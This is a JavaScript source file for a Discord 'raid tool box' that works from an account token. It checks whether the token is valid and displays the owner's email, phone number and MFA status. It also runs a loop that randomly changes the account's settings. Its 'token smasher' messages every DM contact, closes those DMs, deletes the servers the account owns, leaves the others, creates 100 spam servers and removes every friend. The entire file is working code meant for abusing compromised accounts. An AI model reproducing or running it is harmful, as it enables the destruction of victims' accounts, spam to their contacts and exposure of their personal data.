let glitch_status = false;


function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function randomInt(range1, range2){
    return Math.floor(Math.random() * (+range1 - (+range2 + 1)) + (range2 + 1))
}

function randomChoice(lst){
    return lst[randomInt(0, lst.length - 1)]
}

async function token_info(){
    let token = document.getElementById('token_info_token_box').value;
    let resposne = await fetch(`https://discord.com/api/v6/invite/${randomInt(1,9999999)}`,{
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': token
        }
    })
    let valid;
    await resposne.json().then((data) => {
        if (resposne.status == 401 || data.message == "You need to verify your account in order to perform this action."){
            valid = false;
            document.getElementById('token_info_content').innerHTML = marked('## Token is Invalid');
        }
        else{
            valid = true;
        }
    });
    if (valid){
        let token_requests = await fetch(`https://canary.discordapp.com/api/v8/users/@me`,{
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': token
            }
        })
        await token_requests.json().then((data) => {
            document.getElementById('token_info_content').innerHTML = marked(`
# Valid Token
**Mention:** ${data.username}#${data.discriminator}\n
**ID:** ${data.id}\n

**Email:** ${data.email}\n
**Mfa:** ${data.mfa_enabled}\n
**Phone:** ${data.phone}\n
**Locale:** ${data.locale}\n

**Verified:** ${data.verified}\n
**Nsfw Allowed:** ${data.nsfw_allowed}\n
            `);
            console.log(data)
        })
    }
}

async function start_stop_glitch(){
    let start_btn = document.getElementById('token_start_btn');
    if (!glitch_status){
        glitch_status = true;
        start_btn.style.borderColor = '#fd2727';
        start_btn.value = 'Stop';
        await token_glitch();
    }
    else{
        glitch_status = false;
        start_btn.style.borderColor = '#2ecc71';
        start_btn.value = 'Start';
    }
}

async function token_glitch(){
    let locales = [
        "da", "de",
        "en-GB", "en-US",
        "es-ES", "fr",
        "hr", "it",
        "lt", "hu",
        "nl", "no",
        "pl", "pt-BR",
        "ro", "fi",
        "sv-SE", "vi",
        "tr", "cs",
        "el", "bg",
        "ru", "uk",
        "th", "zh-CN",
        "ja", "zh-TW",
        "ko"
    ];  
    let statuses = ["online", "idle", "dnd", "invisible"];
    let themes =["light", "dark"];

    let box_lang = document.getElementById('token_glitcher_language_box');
    let box_theme = document.getElementById('token_glitcher_theme_box');
    let token = document.getElementById('token_glicher_token_box').value;
    while (glitch_status){
        let settings = {
            'theme': themes[0],
            'locale': randomChoice(locales),
            'status': randomChoice(statuses),
            'message_display_compact': false,
        };
        let resposne = await fetch(`https://discord.com/api/v8/users/@me/settings`,{
            method: 'PATCH',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': token
            },
            body: JSON.stringify(settings)
        })
        if (resposne.status == 200 || resposne.status == 204){
            box_lang.value = `Language: [${settings['locale']}]`;
            box_theme.value = `Theme: [${settings['theme']}]`;
        }else{
            box_lang.value = `Language: [INVALID]`;
            box_theme.value = `Theme: [INVALID]`;
        }
        themes.reverse();
        await resposne.json().then((data) => {
            console.log(data);
        })
    }

}


async function token_smasher(){
    let box_token = document.getElementById('token_smasher_token_box');
    let box_message = document.getElementById('smasher_dm_message');
    let box_content =  document.getElementById('smasher_content');
    let box_btn = document.getElementById('token_smasher_btn');
    let box_glds_name = document.getElementById('smasher_guilds_name');

    box_content.style.display = 'block';
    box_content.disabled = true;
    box_message.disabled = true;
    box_token.disabled = true;
    box_btn.disabled = true;
    box_glds_name.disabled = true;

    box_btn.style.borderColor = '#fff020';
    box_btn.value = 'Wait For End...';

    let resposne = await fetch(`https://discord.com/api/v6/invite/${randomInt(1,9999999)}`,{
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': box_token.value
        }
    })

    let valid;
    await resposne.json().then((data) => {
        if (resposne.status == 401 || data.message == "You need to verify your account in order to perform this action."){
            valid = false;
            box_content.innerHTML = marked('## Token is Invalid');
        }
        else{
            valid = true;
        }
    });

    if (valid){
        let guilds_leave = 0;
        let guilds_delete = 0;
        let guilds_create = 0;
        let friends_remove = 0;
        let dms_send = 0;
        let dms_close = 0;

        let guilds_names;
        if (box_glds_name.value.replace(/\s+/, "").length == 0){
            guilds_names = 'Egnil Raid Tool Box';
        }else{
            guilds_names = box_glds_name.value;
        }
        let request_channels = await fetch(`https://discord.com/api/v8/users/@me/channels`,{
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': box_token.value
            }
        })
        await request_channels.json().then(async(channels) => {
            for (channel of channels){
                if (box_message.value.replace(/\s+/, "").length > 0){
                    let request_send = await fetch(`https://discord.com/api/v8/channels/${channel.id}/messages`,{
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Authorization': box_token.value
                        },
                        body: JSON.stringify({content: box_message.value})
                    })
                    if (request_send.ok){
                        dms_send ++;
                    }
                }
                let request_close_dm = await fetch(`https://discord.com/api/v8/channels/${channel.id}`,{
                    method: 'DELETE',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': box_token.value
                    },
                    body: JSON.stringify({content: box_message.value})
                })
                if (request_close_dm.ok){
                    dms_close ++;
                }
                box_content.innerHTML = marked(`
<span>DMs Removed:</span> **${dms_close}**\n
<span>DMs Send:</span> **${dms_send}**\n          
`);
            } 
        })
        let request_guilds = await fetch(`https://discord.com/api/v8/users/@me/guilds`,{
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': box_token.value
            }
        })
        await request_guilds.json().then(async(guilds) => {
            for (guild of guilds){
                if (guild.owner){
                    let request_guild = await fetch(`https://discord.com/api/v8/guilds/${guild.id}`,{
                        method: 'DELETE',
                        headers: {
                            'Content-Type': 'application/json',
                            'Authorization': box_token.value
                        }
                    })
                    if (request_guild.ok){
                        guilds_delete ++;
                    }
                }else{
                    let request_guild = await fetch(`https://discord.com/api/v8/users/@me/guilds/${guild.id}`,{
                        method: 'DELETE',
                        headers: {
                            'Authorization': box_token.value
                        }
                    })
                    if (request_guild.ok){
                        guilds_leave ++;
                    }
                }
                box_content.innerHTML = marked(`
<span>DMs Removed:</span> **${dms_close}**\n
<span>DMs Send:</span> **${dms_send}**\n     
<span>Guilds Deleted:</span> **${guilds_delete}**\n
<span>Guilds Leaved:</span> **${guilds_leave}**\n         
`);
            } 
        })
        for (let create_count = 1; create_count <= 100; create_count++){
            let request_guild = await fetch(`https://discord.com/api/v8/guilds`,{
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': box_token.value
                },
                body: JSON.stringify({name: guilds_names})
            })
            if (request_guild.ok){
                guilds_create ++;
            }
            box_content.innerHTML = marked(`
<span>DMs Removed:</span> **${dms_close}**\n
<span>DMs Send:</span> **${dms_send}**\n     
<span>Guilds Deleted:</span> **${guilds_delete}**\n
<span>Guilds Leaved:</span> **${guilds_leave}**\n
<span>Guilds Created:</span> **${guilds_create}**\n      
            `);
        }

        let request_freinds = await fetch(`https://discord.com/api/v8/users/@me/relationships`,{
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': box_token.value
            }
        })
        await request_freinds.json().then(async(freinds) => {
            for (member of freinds){
                let request_member = await fetch(`https://discord.com/api/v8/users/@me/relationships/${member.id}`,{
                    method: 'DELETE',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': box_token.value
                    }
                })
                if (request_member.ok){
                    friends_remove ++;
                }
                box_content.innerHTML = marked(`# <span>[</span>Complited<span>]</span>
<span>DMs Removed:</span> **${dms_close}**\n
<span>DMs Send:</span> **${dms_send}**\n     
<span>Guilds Deleted:</span> **${guilds_delete}**\n
<span>Guilds Leaved:</span> **${guilds_leave}**\n
<span>Guilds Created:</span> **${guilds_create}**\n
<span>Friends Removed:</span> **${friends_remove}**\n`);
            }
        })
    }

    console.log('123')


    box_content.disabled = false;
    box_message.disabled = false;
    box_token.disabled = false;
    box_btn.disabled = false;
    box_glds_name.disabled = false;

    box_btn.style.borderColor = '#2ecc71';
    box_btn.value = 'Start'
}
